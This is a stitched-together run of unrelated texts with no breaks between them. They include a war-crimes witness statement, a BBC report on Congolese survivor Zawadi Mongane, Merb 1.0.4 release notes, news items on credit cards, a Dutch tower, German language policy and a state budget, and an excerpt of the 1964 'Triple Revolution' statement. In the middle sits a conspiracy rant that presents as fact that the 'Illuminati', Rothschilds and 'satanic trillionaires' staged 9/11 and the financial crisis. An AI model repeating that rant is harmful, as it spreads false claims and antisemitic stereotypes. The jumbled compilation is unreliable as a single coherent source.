We can never prevent individual war crimes , but we can , if enough of us speak out , influence government policy .
We can reject government propaganda that depicts our enemies as subhuman and encourages the kind of outrages I witnessed .
We can protest the bombing of civilian targets , which still goes on today .
And we can refuse ever to condone our government 's murder of unarmed and defeated prisoners of war .
I realize it 's difficult for the average citizen to admit witnessing a crime of this magnitude , especially if implicated himself .
Even G.I.s sympathetic to the victims were afraid to complain and get into trouble , they told me .
And the danger has not ceased .
Since I spoke out a few weeks ago , I have received threatening calls and had my mailbox smashed .
But its been worth it .
Writing about these atrocities has been a catharsis of feelings suppressed too long , a liberation , that perhaps will remind other witnesses that " the truth will make us free , have no fear . "
We may even learn a supreme lesson from all this : only love can conquer all .

Today Programme
Zawadi's interview inspired a spontaneous response from listeners
When I first met Zawadi Mongane in April 2007 I was both shocked by her terrible story and moved by her courage in telling it .
Yet I never imagined that the plight of a young mother in eastern Congo would have a similar effect on so many listeners to this programme .
At many points during that first interview Zawadi broke down , unable to hold back the tears , as she revealed how she had been forced to hang her own baby after watching rebel soldiers butcher dozens of people in front of her .
Please turn on JavaScript .
Media requires JavaScript to play .
The victims included her brother and two oldest children .
At one point I asked if she wanted to stop but she resolutely shook her head .
" If the world does n't know what is happening here , the killing and raping will never stop .
Nobody will ever help us , " she said .
To be honest , I was not sure whether her awful story would make any difference at a time when people are constantly confronted with so much suffering .
In the past I would often think about killing myself but now that I know you are there I do n't feel that urge anymore
Zawadi Mongane
How to help I have never been so glad to be wrong .
Searching for Zawadi In May this year I had returned to eastern Congo to try and find Zawadi .
Nobody knew what had happened to her since her release from hospital .
With the help of hospital staff and the charity Christian Relief Network I finally tracked her down to a small mud-floored shack in a particularly impoverished area of Bukavu , where she lives with her sole surviving child , five - year - old Reponse .
A still traumatised Zawadi , who spent much of the interview staring vacantly at the ceiling , told me that she could not even count on retaining this flimsy and leaking roof over her head .
Please turn on JavaScript .
Media requires JavaScript to play .
In search of Zawadi
The local Catholic church had paid her rent until the end of May but a penniless Zawadi was warned they could not provide help after that .
Soon after telling me this , her sad eyes returned to the ceiling for a while before fixing on five - year - old Reponse , who was hugging her mother tightly .
" My daughter knows two things .
She knows that her father was killed and she knows that they killed me too , in a way , " she said .
" I tell her how difficult my life is and I show her how I have been killed too .
It is very difficult to forget that picture , that moment , when I was ... when I was made to kill my own baby . "
Listeners respond
When this was broadcast the response from Today listeners was extraordinary .
E-mails and letters offering help , some of the latter packed full of cash , flooded in .
Even parcels arrived with presents for Zawadi and Reponse .
One woman , who had heard my follow - up interview on the Today website , wrote out a cheque for £ 10,000 to the charity Medecins Sans Frontiers , who help the thousands of victims of sexual violence in eastern Congo .
Another listener donated £ 2,000 to assist people in Zawadi 's position .
But even more than the size of some donations , what amazed me most was the sheer number of people who gave whatever they could afford .
Donations from listeners have paid for Reponse 's school fees
As a result of such generosity Zawadi 's rent has now been paid for three years and she has been able to set up a small shop which she hopes will enable her to pay her own way in the future .
Donations from Today listeners have also paid her daughter 's school fees for the next three years .
When I met Reponse she told me how she dreamed of becoming a doctor one day so that she could help people like her mother get well .
Now , Zawadi says , she is dreaming of becoming a doctor even more .
Zawadi , too , is dreaming .
She hopes that her daughter will eventually be able to escape the violence and despair around her and lead a new life .
" Even if I should die I 'm sure that Reponse will have a good future .now that she 's going to go to school , " she says .
Zawadi also had some words for all those who have helped her so much .
" I thank you for everything you have done for me and for helping me have a future .
In the past I would often think about killing myself but now that I know you are there I do n't feel that urge anymore . "
Mike Thomson has won the 2008 Bayeux Calvados Award for War Correspondents , in the radio category , for his report In Search of Zawadi .

Hey guys !
We just released Merb 1.0.4 .
Some highlights :
Update rake install and rake release : merb to work correctly
Modify cache README to accurately reflect the best practice for setting up the cache
Set the fatal !
warning to print out to STDOUT , assuming STDOUT is the terminal ( this was previously causing specs that caused a fatal to silently fail , but print the fatal warning to the log )
Fix dependencies to remember the backtrace when they were declared , so that failing to load a dependency prints the backtrace at declaration time , rather than printing a backtrace in Merb 's bootloader .
A boatload of fixes to begin work to make Merb work on 1.9
Fix code reloading in non-forking environments , including correctly loading files that were loaded as the result of requiring the initial file , as well as correctly handling files that were previously required ( i.e. do n't re-require files at load , but do on reload ) .
Significantly speed up content negotiation ( we were previously using an expensive class - based approach when a simple array approach would do ) .
We have a fairly good test - suite for content - negotiation , but please alert us to any new failures in exotic scenarios .
In addition , the most expensive part of content - negotiation is now cached , which requires a cache mutex .
Given how expensive it was before caching , we felt that adding a mutex was acceptable .
If you find that performance under heavy concurrency has degraded , please let us know .
Modify Merb.logger .* to take a block , which defers the evaluation of the thing to print until it is determined that , in fact , the printing needed to happen .
For instance , Merb.logger.debug params.some_expensive_operation becomes Merb.logger.debug { params.some_expensive_operation } , so that some_expensive_operation is not run in production mode .
last_modified and last_modified= were modified to support DateTimes ( coming out of an ORM ) in addition to pure times .
A bug related to JRuby backtraces was only partially resolved in 1.0.3 .
It is fully resolved in 1.0.4 .
The backtrace checkboxes no longer display in : show_exception_details is false .
We now support socket files containing %s , which will be replaced with the socket number .
merb.visit , merb.click_link , and other Webrat helpers are now available in console mode , if webrat is installed .
If it is not , we no longer throw an error in any circumstance , but print a warning about unavailable features .
multipart_request now preserves the session , but with an API change .
If you would like to opt into the new feature , require " merb- core / two-oh " in your init.rb .
The new multipart_request takes a path , params , and the rack environment , but does not take a block .
It returns the same object that request ( ) returns and therefore can be used with the be_successful , etc. rspec matchers .
You should use multipart_post and multipart_put in most cases .
The multipart helper tests were updated to reflect the new changes , and require " merb- core /one-oh " .
The specs in spec10 were not modified , and do not opt - in to the new changes .
Merb 1.0.5 will focus exclusively on improving the dependency situation ( which we know sucks ) and is expected next Monday .
Have a happy week !

We were hit with the greatest act of terror in our nation 's history on 911 , an intelligence failure of the highest magnitude , and no one got so much as a hand - slap while many even got promoted .
Now we have the world 's greatest financial failure , and not only do we not see anyone getting a hand - slap , we see each of the very people responsible for this debacle getting golden parachutes and bonuses in the tens of millions of dollars as they resign in disgrace , and few are fired other than the hard - working employees who had little or nothing to do with making the big decisions that brought about the ruination of their companies .
There is no such thing as responsibility or accountability anymore for our leaders in government and business .
Perhaps this is the comeuppance of a society that teaches moral relativism .
They did what was right in their own eyes , so who are we to condemn them ?
But the most cogent reason for this lack of accountability is that our governmental and business systems have been corrupted in their upper echelons by the Puppet Masters and their bootlicking , puppet sycophants .
The satanic trillionaires , the Illuminati , who we just referred to as the Puppet Masters , such as the Rockefeller 's , the Rothschild 's and the Black Nobility of Europe , who run the world as everyone 's shadow government , are rewarding the people who are responsible for causing these disasters because these people have done exactly as they were told .
For these people to have done otherwise would have been very bad for their continued health and / or their reputations .
They were all following orders and knew exactly what they were doing .
The many events surrounding 911 and the various forces and causes behind the current financial catastrophe have been carefully planned and implemented for many decades by the Illuminati .
The purpose of 911 was to scare sucker - dupe Americans into giving up their many precious Constitutional freedoms and protections , with the ultimate goal being to have Americans abandon the Constitution and give up their sovereignty in favor of global governance , with a regional arrangement such as the clandestine Security and Prosperity Partnership of North America ( SPP ) sufficing as a stepping stone to a one - world Orwellian police state .
As a bonus , via 911 , they were able to shed more of our children 's blood in yet another phony , false - flag war for profit so they could continue to line their pockets with trillions of dollars along the way to their precious one - world government .
Then , as an added bonus , this pathetic group of satanic sociopaths and malefactors arranged for the staged election of the King of Abortion as our next President so that more innocent blood could be shed on the alter of world government .
After all , we can't have a bunch of pesky new children running around , thus clogging up the system with too many serfs who the Illuminati could not easily control .
The purpose of the current financial catastrophe was to infect the entire world financial system with toxic waste and other unregulated derivatives , also known as financial weapons of mass destruction , to bring it crashing down so that a single world financial system with a single medium of exchange could be set forth as the suggested solution and then crammed down our throats in yet another nauseating and tiresome iteration of the Hegelian Dialectic .
The Illuminati will attempt to blame the resulting financial debacles on the cutthroat competition and rampant cheating that goes on between the various national economies , meaning that we have to have a single world financial system with centralized regulation and oversight to put an end to these shenanigans so we can all work together toward world financial prosperity .
But in reality , it is the Illuminati themselves who are the root cause behind all those shenanigans , which they continually wage in furtherance of their plans to implement a global , corporatist , fascist police state of Orwellian feudality .
And the only financial prosperity they intend to bring about will not be the world prosperity , which they will promise .
The prosperity of the would - be masters of the universe is the only prosperity anyone will ever see if they are allowed to implement their one - world government and global financial system .
The rest of us will live in Halliburton - built , slave - labor internment camps , enjoying our daily cup of gruel as we are worked into an early grave for Illuminist fun and profits , while our children are sent to centralized disinformation camps to be brainwashed and programmed into good , little , compliant serfs so they can serve their satanic masters with alacrity and enthusiasm .
Hence , the Illuminist henchmen - destroyers get their disgusting golden parachutes while the rest of us get hyper - inflated into oblivion .
What you see happening at the corporate level is a microcosm of what these miscreants have in store for everyone on a global basis .
They get the gold mine ; you get the shaft -- the Illuminist plan in a nutshell .
If we are going to hyper - inflate our economy into oblivion , at least let 's do it the right way .
Throwing trillions at failed financial and business institutions saddled with moronic , outdated business plans aimed at bringing about the intentional destruction of these companies in order to bust unions , to ship our good - paying jobs overseas and to implement a centralized global economy and government , while simultaneously rewarding the morons who destroyed these institutions by continuing their employment , while throwing in hefty salaries and bonuses to boot , is , it would seem to us , hardly an intelligent use of the printing press .
Let 's at least give the sheople one final party before we send them to forced labor internment camps or draft them into compulsory cannon fodder service and send them overseas to meddle in everyone else 's affairs as they get blown up by IED's .
Let 's give them a blindfold and one final cigarette before we execute them with hyper- stagflation .
It should be obvious that throwing hundreds of billions into a black hole of losses numbering in the tens , and perhaps even hundreds , of trillions ( i.e. the Quadrillion Dollar Derivative Death Star ) , is like trying to empty the Pacific Ocean with a coffee can .
Let 's take ten trillion and buy out all the mortgages in the US , and then modify all the interest rates to a 5 % fixed rate .
We can float 10 year treasuries at 2 % to fund the deal , and pocket the 3 % spread of $ 300 billion , which we can use to shore up our budget deficit , to rejuvenate zombie corporations after we run them through Chapter 11 , and to make loan workouts for those who can't even afford 5 % , which would number in the millions , because fogging a mirror was the only qualification for getting a mortgage over the past five or so years .
This will cure all real estate defaults and immediately convert the toxic waste into real AAA paper for the first time while everyone gets to buy a new house at 5 % fixed also , thus saving the real estate market .
The banks , now flush with cash , can start lending again because their balance sheets have been restored , and get back into the mortgage business by doing both refinances and purchases , while our foreign owners of agencies and treasuries rejoice , and while owners of what was once toxic waste start tap dancing on the ceiling .
As the government - owned mortgages are paid off , we can use the proceeds to either float new mortgages at a 3 % spread , or we can use the payoff money to pay down the ten trillion dollar treasury loan and let the banks take over again , this time with oversight and regulations that will put people in jail if they pull their cute little scams again .
We can then also float another ten trillion dollars in bonds at 2 % , and give every American , young and old , $ 33,000 , which they would have to use with the following pre-established priorities : ( 1 ) Cure any mortgage defaults , ( 2 ) pay off any credit cards and car loans , and ( 3 ) buy a hybrid car that gets 30 + miles per gallon from an American car manufacturer , or in the alternative , set up an IRA funded by gold and silver to protect against the upcoming hyperinflation , or for the younger citizens , set up a college fund if they can qualify for college .
That will cure all the consumer loan defaults and restore value to all the derivatives associated with them , revive our manufacturing sector , solve our energy crisis , provide reliable transportation so everyone can get off welfare and go to work , get our kids educated , and set us all up for retirement with inflation - proofing through gold and silver , while pushing trillions in available loan funds back into the banking sector to totally re-grease the system .
What the heck is $ 20 trillion when we already owe $ 100 trillion ?
Sure , it 's certainly hyperinflationary , but what is the alternative ?
The alternative is a purging of the system and ultimate decade long depression for the world financial system with a major war as the cure , which the Illuminists will use to destroy our precious Constitutional rights and pave the way for a one - world government .
The same will happen if we hyper - inflate , but much further down the line , and you at least get to have one final party together with some gold and silver protection , and who knows , we might figure a way out in the meantime .
You will never see such a plan implemented , because as should be obvious from the $ 700 billion Paulson Ponzi Plunder Plan , the idea is to bankrupt the middle class , and not to save it , by pumping taxpayer largesse into failed and insolvent banking and business entities so that the dollars are wasted and are used to destroy the middle class with hyper- stagflation , while Illuminist executives walk away with trillions in salaries , bonuses and stock dividends after buying up all the smaller fry in a fresh round of competition elimination .
The Illuminists want to play god with your money and decide who lives and dies in the business world .
Obviously it is their crony capitalist companies that will survive , while everyone else heads off to see the bankruptcy trustee , who will then auction off all their assets at pennies on the dollar to newly formed and nationalized Illuminist super - conglomerates that will swallow up all the old discarded , insolvent Illuminist companies that have sucked out the value of our money through their black hole of losses .
These new super - conglomerates will form the backbone of our new corporatist , fascist , Orwellian police state .
As we said , they get the gold mine ; you get the shaft .
Expecting the Illuminati to do anything that would benefit working Americans is a form of insane delusion .
We are told that the Federal Reserve may cut interest rates another ½ % to 1 % in December .
Normally , when the Fed cuts rates , credit - card issuers follow suit , resulting in lower monthly payments for cardholders .
Rates have generally fallen slightly , but banks and retailers are trying to offset rising costs and loses by raising fees .
Those with less than perfect credit ratings and those with excellent credit ratings are having credit lines cut dramatically .
They are raising rates on cash advances and overdraft protection .
JP Morgan
Chase will start charging a new monthly fee of $ 10.00 for cardholders who have been carrying large balances for at least two years , while raising their minimum monthly payments to 5 % of their outstanding balance , from 2 % .
Citigroup ’s Citibank and American Express will raise such rates 2 % to 3 % .
Amex is raising its rates on cash advances , late payments and defaults , increasing its foreign - exchange fee to 2.7 % from 2 % on its consumer and small - business cards and eliminating ways to earn rewards on one of its popular cards .
Home Depot is reducing credit lines on its in - state cards .
Nordstroms and Target are raising interest rates on in - store cards
In the third quarter credit card losses at issuer banks were over 5 % of total credit card balances and are poised to deteriorate further .
This is why interest rates are climbing and fees are rising .
You get penalized because others do not pay their bills .
Now you can better understand why we have been telling you for the past eight years to eliminate credit card and revolving debt .
It is the most expensive of all debt .
Credit card use in the second quarter fell 5 % from the first quarter to $ 663 million , the biggest drop in several years .
Promotional deals are being done away with or cut back as are reward programs .
You will see them in next month ’s mailing or you ’ve already noticed some changes .
All we can say is pay off those balances monthly as they occur and get rid of debt balances ASAP .
BEDUM , Netherlands ( Reuters ) - The Tower of Pisa is being challenged by a lesser - known 12th - century building in the northern Dutch town of Bedum as Europe ’s most steeply leaning tower .
Retired geometrician Jacob van Dijk said measurements this week on Bedum ’s 36 - metre church tower of Walfridus revealed it is now leaning more than its Italian rival , which lost part of its tilt following restoration works .
At a height of 55.86 meters , Pisa ’s tower leans about 4 meters , while Bedum ’s tower leans 2.61 meters on its height of 35.7 meters .
If both towers were the same height , Bedum would have a greater tilt of 6 cm , Van Dijk argues .
“ In Italy they ’re happy with the result , but here in Bedum we are much more happy , because the tower of Pisa is now leaning less than the tower of Bedum , ” said Van Dijk .

Der neue Grünen - Chef Cem Özdemir will Migranten stärker in ihrer Muttersprache unterrichten lassen .
Damit möchte er sie paradoxerweise besser in Deutschland integrieren .
Kritik an dem Vorstoß kommt vor allem von Erziehungswissenschaftlern .
Ein CDU - Politiker wird besonders deutlich : Er hält Türkisch nicht für eine " global relevante Fremdsprache " .
Anzeige
Der frisch gewählte Grünen - Chef Cem Özdemir wünscht sich eine " farbenblinde Gesellschaft " .
In einem Interview mit der " Bild " - Zeitung äußerte Deutschlands erster Parteivorsitzender mit türkischen Wurzeln die Hoffnung , dass die Herkunft und Glaubensrichtung für ein Ministeramt bald nicht mehr von Belang sind .
Doch es ist weniger die Hoffnung auf Farbenblindheit , sondern auf Mehrsprachigkeit der Gesellschaft , mit der Özdemir für Aufsehen sorgt .
Der Grünen - Chef fordert mehr Türkisch - Unterricht an deutschen Schulen und will damit die Mehrsprachigkeit bei türkischstämmigen Kindern fördern .
Anzeige
" Deutsch muss für Kinder , die hier leben und aufwachsen , immer die wichtigste Sprache sein " , so Özdemir .
Aber Kinder aus Einwandererfamilien sollten ihre Mehrsprachigkeit entfalten können .
" Warum soll an deutschen Schulen neben Englisch , Französisch , Spanisch und Russisch nicht auch mehr Türkisch angeboten werden ? "
Die Kritik an Özdemirs Vorstoß ließ nicht lange auf sich warten .
" Wir sollten uns auf wesentliche Ziele in der Bildungspolitik beschränken " , sagte der Generalsekretär der baden - württembergischen CDU , Thomas Strobl .
Türkisch sei keine " global relevante Fremdsprache " .
Anzeige
Differenzierter dagegen das Urteil der integrationspolitischen Sprecherin der FDP - Bundestagsfraktion , Sibylle Laurischk : " Wer Sprachen lernen will , kann nur gewinnen , aber die Basis muss stimmen . "
Ein erweitertes Fremdsprachenangebot an deutschen Schulen sei prinzipiell zu begrüßen , so die FDP - Politikerin , doch dies sei nur ein zweiter Schritt .
Die Herausforderung , dass alle Kinder beim Schuleintritt Deutsch können , genieße noch immer absoluten Vorrang .
" Ich appelliere an Herrn Özdemir , dass er auch weiterhin ebenso engagiert für das frühe Erlernen der deutschen Sprache wirbt " , sagte Laurischk WELT ONLINE .
An Schulen mit einem hohen Anteil türkischstämmiger Schüler sei es dennoch sinnvoll , die Kenntnisse in der Muttersprache zu fördern und auch im Abschlusszeugnis abzubilden .
Anzeige
Unterstützt wurde die Forderung Özdemirs ebenfalls vom Deutschen Kulturrat , dem Verband der Bundeskulturverbände .
Geschäftsführer Olaf Zimmermann betonte : " Mehr Türkisch - Unterricht nützt den Schülern mit und ohne türkischen Migrationshintergrund gleichermaßen . "
Integration könne nur gelingen , wenn die kulturellen Wurzeln der Schüler ernst genommen würden .
Wissenschaftler begegnen der Forderung nach mehr Türkisch - Unterricht indes kritisch .
" Diese Forderung wird oft mit dem Vorwurf verbunden , an den Schulen betrachte man die Herkunftssprache der Migranten als zweitrangig .
Das ist aber gar nicht unbedingt der Fall " , sagt Rainer Lehmann , Professor für Erziehungswissenschaft an der Humboldt - Universität Berlin .
Wichtiger sei die Frage , welche Sprachen – einschließlich der Fremdsprachen – den Jugendlichen gute Chancen auf eine Integration in den Arbeitsmarkt eröffnen .
Dass mehr Türkisch - Unterricht nicht notwendigerweise die Chancen der Migranten erhöht , meint auch der Würzburger Bildungsforscher Heinz Reinders : " Letztlich muss es um eine Balance zwischen der Herkunfts - und der Aufnahmekultur gehen .
Auch Schülern mit türkischsprachigem
Elternhaus wäre nicht damit gedient , wenn am Ende auf dem Schulhof und auch im Unterricht türkisch gesprochen würde . "
Zudem sei es – vor dem Hintergrund des Gleichbehandlungsgrundsatzes – schwierig zu rechtfertigen , ausgerechnet Türkisch und keine der anderen Herkunftssprachen als Schulfach einzuführen .
" Selbst in Berlin machen die Schüler mit türkischem oder dem sprachlich davon zu unterscheidenden kurdischen Hintergrund lediglich einen Anteil von 40 Prozent aus " , betont Erziehungswissenschaftler Lehmann .
Ein Großteil der der Migranten komme aus dem arabischen Sprachraum , Russland , Polen , dem ehemaligen Jugoslawien , dem Iran oder Afghanistan .
Es sei schlichtweg unrealistisch , für alle Schüler Unterricht in der Herkunftssprache anzubieten .
Außerdem müsse man sich fragen , so Lehmann weiter , " ob der Staat hier wirklich in der Bringschuld steht , Sprachunterricht in allen weit über hundert Herkunftssprachen zu erteilen , die wir hier in Deutschland haben " .
— State agencies have already started trimming their budgets to deal with the struggling economy , but an independent analyst said Tuesday that officials might have to make deep cuts next year .
In a grim long - term forecast , Elaine Mejia said the state budget deficit could top $ 3 billion by the 2009 - 2010 fiscal year , which starts next July .
" It 's going to be probably the most difficult budgeting situation our state lawmakers have faced in decades , " said Mejia , project director of the NC Budget & Tax Center , a left - leaning public policy group .
A legislative budget analyst said last week that the state 's deficit would likely be between $ 800 million and $ 1.6 billion during the current fiscal year .
Gov. Mike Easley already has ordered state agencies to cut their budgets by 2 percent to 5 percent to make up for the slowing stream of tax revenue .
Mejia said the trend of declining taxes on sales and on corporate and personal incomes will blow an even bigger hole in the budget as the national recession continues .
If spending growth stays the same and state workers get a 2 percent raise next July , she has forecast a shortfall of up to $ 3.3 billion , which amounts to about 15 percent of the budget .
" If we 're going to have to meet that entire budget shortfall strictly with spending cuts , that 's going to mean , certainly , layoffs of state workers , drastic underfunding of public schools ( and ) lots of things that a lot of people are going to be very , very concerned about , " she said .
Governor - elect Beverly Perdue has n't yet said whether she would be willing to consider deeper cuts or tax increases to deal with the deficit .
Legislative leaders have said they want to see updated financial forecasts before acting .
State Sen. Neal Hunt , R - Wake , said the next session of the General Assembly will be a painful , but important , year for lawmakers to cut unnecessary spending .
" It 's going to be hairy .
It 's going to be tough because we 're going to have to make some hard decisions , " Hunt said .
" I think raising taxes would be a bad mistake right now .
... I can see no raises ( for state workers ) . "
Mejia disagreed with Hunt on the tax question , saying lawmakers need to look at reforming the tax system to include collecting sales tax on services provided by everyone from barbers to accountants .
" They 're going to have to talk about ways that we can raise revenues , " she said .
Hunt said new taxes unfairly punish those who create jobs .

THE TRIPLE REVOLUTION
Cybernation Weaponry Human Rights
The Ad Hoc Committee on the Triple Revolution
This statement is written in the recognition that mankind is at a historic conjuncture which demands a fundamental reexamination of existing values and institutions .
At this time three separate and mutually reinforcing revolutions are taking place :
The Cybernation Revolution : A new era of production has begun .
Its principles of organization are as different from those of the industrial era as those of the industrial era were different from the agricultural .
The cybernation revolution has been brought about by the combination of the computer and the automated self - regulating machine .
This results in a system of almost unlimited productive capacity which requires progressively less human labor .
Cybernation is already reorganizing the economic and social system to meet its own needs .
The Weaponry Revolution : New forms of weaponry have been developed which cannot win wars but which can obliterate civilization .
We are recognizing only now that the great weapons have eliminated war as a method for resolving international conflicts .
The ever - present threat of total destruction is tempered by the knowledge of the final futility of war .
The need of a “ warless world ” is generally recognized , though achieving it will be a long and frustrating process .
The Human Rights Revolution : A universal demand for full human rights is now clearly evident .
It continues to be demonstrated in the civil rights movement within the United States .
But this is only the local manifestation of a worldwide movement toward the establishment of social and political regimes in which every individual will feel valued and none will feel rejected on account of his race .
We are particularly concerned in this statement with the first of these revolutionary phenomena .
This is not because we underestimate the significance of the other two .
On the contrary , we affirm that it is the simultaneous occurrence and interaction of all three developments which make evident the necessity for radical alterations in attitude and policy .
The adoption of just policies for coping with cybernation and for extending rights to all Americans is indispensable to the creation of an atmosphere in the U.S. in which the supreme issue , peace , can be reasonably debated and resolved .
Interaction of Three Revolutions
The Negro claims , as a matter of simple justice , his full share in America 's economic and social life .
He sees adequate employment opportunities as a chief means of attaining this goal : The March on Washington demanded freedom and jobs .
The Negro ’s claim to a job is not being met .
Negroes are the hardest - hit of the many groups being exiled from the economy by cybernation .
Negro unemployment rates cannot be expected to drop substantially .
Promises of jobs are a cruel and dangerous hoax on hundreds of thousands of Negroes and whites alike who are especially vulnerable to cybernation because of age or inadequate education .
The demand of the civil rights movement cannot be fulfilled within the present context of society .
The Negro is trying to enter a social community and a tradition of work - and - income which are in the process of vanishing even for the hitherto privileged white worker .
Jobs are disappearing under the impact of highly efficient , progressively less costly machines .
The U.S. operates on the thesis , set out in the Employment Act of 1964 , that every person will be able to obtain a job if he wishes to do so and that this job will provide him with resources adequate to live and maintain a family decently .
Thus job - holding is the general mechanism through which economic resources are distributed .
Those without work have access only to a minimal income , hardly sufficient to provide the necessities of life , and enabling those receiving it to function as only “ minimum consumers . ”
As a result , the goods and services which are needed by these crippled consumers , and which they would buy if they could , are not produced .
This in turn deprives other workers of jobs , thus reducing their incomes and consumption .
Present excessive levels of unemployment would be multiplied several times if military and space expenditures did not continue to absorb ten per cent of the gross national product ( i.e. , the total goods and services produced ) .
Some six to eight million people are employed as a direct result of purchases for space and military activities .
At least an equal number hold their jobs as an indirect result of military or space expenditures .
In recent years , the military and space budgets have absorbed a rising proportion of national production and formed a strong support for the economy .
However , these expenditures are coming in for more and more criticism , at least partially in recognition of the fact that nuclear weapons have eliminated war as an acceptable method for resolving international conflicts .
Early in 1964 , President Johnson ordered a curtailment of certain military expenditures .
Defense Secretary McNamara is closing shipyards , airfields , and Army bases , and Congress is pressing the National Space Administration to economize .
The future of these strong props to the economy is not as clear today as it was even a year ago .
The Nature of the Cybernation Revolution
Cybernation is manifesting the characteristics of a revolution in production .
These include the development of radically different techniques and the subsequent appearance of novel principles of the organization of production ; a basic reordering of man 's relationship to his environment ; and a dramatic increase in total available and potential energy .
The major difference between the agricultural , industrial and cybernation revolutions is the speed at which they developed .
The agricultural revolution began several thousand years ago in the Middle East .
Centuries passed in the shift from a subsistence base of hunting and food - gathering to settled agriculture .
In contrast , it has been less than 200 years since the emergence of the industrial revolution , and direct and accurate knowledge of the new productive techniques has reached most of mankind
This swift dissemination of information is generally held to be the main factor leading to widespread industrialization .
While the major aspects of the cybernation revolution are for the moment restricted to the U.S. , its effects are observable almost at once throughout the industrial world and large parts of the non-industrial world .
Observation is rapidly followed by analysis and criticism .
The problems posed by the cybernation revolution are part of a new era in the history of all mankind but they are first being faced by the people of the U.S .
The way Americans cope with cybernation will influence the course of this phenomenon everywhere .
This country is the stage on which the machines - and - man drama will first be played for the world to witness .
The fundamental problem posed by the cybernation revolution in the U.S. is that it invalidates the general mechanism so far employed to undergird people ’s rights as consumers .
Up to this time economic resources have been distributed on the basis of contributions to production , with machines and men competing for employment on somewhat equal terms .
In the developing cybernated system , potentially unlimited output can be achieved by systems of machines which will require little cooperation from human beings .
As machines take over production from men , they absorb an increasing proportion of resources while the men who are displaced become dependent on minimal and unrelated government measures — unemployment insurance , social security , welfare payments .
These measures are less and less able to disguise a historic paradox :
That a substantial proportion of the population is subsisting on minimal incomes , often below the poverty line , at a time when sufficient productive potential is available to supply the needs of everyone in the U.S .
The existence of this paradox is denied or ignored by conventional economic analysis .
The general economic approach argues that potential demand , which if filled would raise the number of jobs and provide incomes to those holding them , is underestimated .
Most contemporary economic analysis states that all of the available labor force and industrial capacity is required to meet the needs of consumers and industry and to provide adequate public services : Schools , parks , roads , homes , decent cities , and clean water and air .
It is further argued that demand could be increased , by a variety of standard techniques , to any desired extent by providing money and machines to improve the conditions of the billions of impoverished people elsewhere in the world , who need food and shelter , clothes and machinery and everything else the industrial nations take for granted .
There is no question that cybernation does increase the potential for the provision of funds to neglected public sectors .
Nor is there any question that cybernation would make possible the abolition of poverty at home and abroad .
But the industrial system does not possess any adequate mechanisms to permit these potentials to become realities .
The industrial system was designed to produce an ever - increasing quantity of goods as efficiently as possible , and it was assumed that the distribution of the power to purchase these goods would occur almost automatically .
The continuance of the income - through jobs link as the only major mechanism for distributing effective demand — for granting the right to consume — now acts as the main brake on the almost unlimited capacity of a cybernated productive system .
Recent administrations have proposed measures aimed at achieving a better distribution of resources , and at reducing unemployment and underemployment .
A few of these proposals have been enacted .
More often they have failed to secure congressional support .
In every case , many members of Congress have criticized the proposed measures as departing from traditional principles for the allocation of resources and the encouragement of production .
Abetted by budget - balancing economists and interest groups they have argued for the maintenance of an economic machine based on ideas of scarcity to deal with the facts of abundance produced by cybernation .
This time - consuming criticism has slowed the workings of Congress and has thrown out of focus for that body the inter - related effects of the triple revolution .
An adequate distribution of the potential abundance of goods and services will be achieved only when it is understood that the major economic problem is not how to increase production but how to distribute the abundance that is the great potential of cybernation .
There is an urgent need for a fundamental change in the mechanisms employed to insure consumer rights .
Facts and Figures
No responsible observer would attempt to describe the exact pace or the full sweep of a phenomenon that is developing with the speed of cybernation .
Some aspects of this revolution , however , are already clear :
* The rate of productivity increase has risen with the onset of cybernation .
* An industrial economic system postulated on scarcity has been unable to distribute the abundant goods and services produced by a cybernated system or potential in it .
* Surplus capacity and unemployment have thus co-existed at excessive levels over the last six years .
* The underlying cause of excessive unemployment is the fact that the capability of machines is rising more rapidly than the capacity of many human beings to keep pace .
* A permanent impoverished and jobless class is established in the midst of potential abundance .
Evidence for these statements follows :
1 . The increased efficiency of machine systems is shown in the more rapid increase in productivity per man - hour since 1960 , a year that marks the first visible upsurge of the cybernation revolution .
In 1961,1962 and 1963 , productivity per man - hour rose at an average pace above three and a half per cent — a rate well above both the historical average and the postwar rate .
Companies are finding cybernation more and more attractive .
Even at the present early stage of cybernation , costs have already been lowered to a point where the price of a durable machine may be as little as one - third of the current annual wage - cost of the worker it replaces .
A more rapid rise in the rate of productivity increase per man - hour can be expected from now on .
2 . In recent years it has proved impossible to increase demand fast enough to bring about the full use of either men or plant capacities .
The task of developing sufficient additional demand promises to become more difficult each year .
A thirty - billion - dollar annual increase in gross national product is now required to prevent unemployment rates from rising .
An additional forty - to - sixty - billion - dollar increase would be required to bring unemployment rates down to an acceptable level .
3 . The official rate of unemployment has remained at or above five and a half per cent during the Sixties .
The unemployment rate for teenagers has been rising steadily and now stands around fifteen per cent .
The unemployment rate for Negro teenagers stands about thirty per cent .
The unemployment rate for teenagers in minority ghettoes sometimes exceeds fifty per cent .
Unemployment rates for Negroes are regularly more than twice those for whites , whatever their occupation , educational level , age or sex .
The unemployment position for other racial minorities is similarly unfavorable .
Unemployment rates in depressed areas often exceeds fifty per cent .
These official figures seriously underestimate the true extent of unemployment .
The statistics take no notice of underemployment or featherbedding .
Besides the five and a half per cent of the labor force who are officially designated as unemployed , nearly four per cent of the labor force sought full - time work in 1962 but could find only part - time jobs .
In addition , methods of calculating unemployment rates — a person is counted as unemployed only if he has actively sought a job recently — ignore the fact that many men and women who would like to find jobs have not looked for them because they know there are no employment opportunities .
Underestimates for this reason are pervasive among groups whose unemployment rates are high — the young , the old , and racial minorities .
Many people in the depressed agricultural , mining , and industrial areas , who by official definition hold jobs but who are actually grossly under - employed , would move if there were prospects of finding work elsewhere .
It is reasonable to estimate that over eight million people are not working who would like to have jobs today as compared with the four million shown in the official statistics .
Even more serious is the fact that the number of people who have voluntarily removed themselves from the labor force is not constant but increases continually .
These people have decided to stop looking for employment and seem to have accepted the fact that they will never hold jobs again .
This decision is largely irreversible , in economic and also in social and psychological terms .
The older worker calls himself “ retired ” ; he cannot accept work without affecting his social security status .
The worker in his prime years is forced onto relief :
In most states the requirements for becoming a relief recipient bring about such fundamental alterations in an individual 's situation that a reversal of the process is always difficult and often totally infeasible .
Teenagers , especially “ drop- outs ” and Negroes , are coming to realize that there is no place for them in the labor force but at the same time they are given no realistic alternative .
These people and their dependents make up a large part of the “ poverty ” sector of the American population .
Statistical evidence of these trends appears in the decline in the proportion of people claiming to be in the labor force — the so - called labor force participation rate .
The recent apparent stabilization of the unemployment rate around five and a half per cent is therefore misleading : it is a reflection of the discouragement and defeat of people who cannot find employment and have withdrawn from the market rather than a measure of the economy 's success in creating jobs for those who want to work .
